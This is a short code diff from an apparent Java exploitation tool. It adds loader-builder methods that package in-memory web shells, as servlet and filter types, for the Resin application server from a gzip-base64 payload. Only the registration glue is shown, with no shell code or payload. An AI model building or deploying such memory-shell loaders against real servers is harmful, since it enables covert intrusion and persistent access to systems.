@@ -159,9 +159,19 @@ public class MSLoaderBuilder {
     @MemShell(MemShell.Listener)
     public byte[] resinListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
-
     }
 
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Servlet)
+    public byte[] resinServlet(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Filter)
+    public byte[] resinFilter(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
 
     /**
      * 直接加载
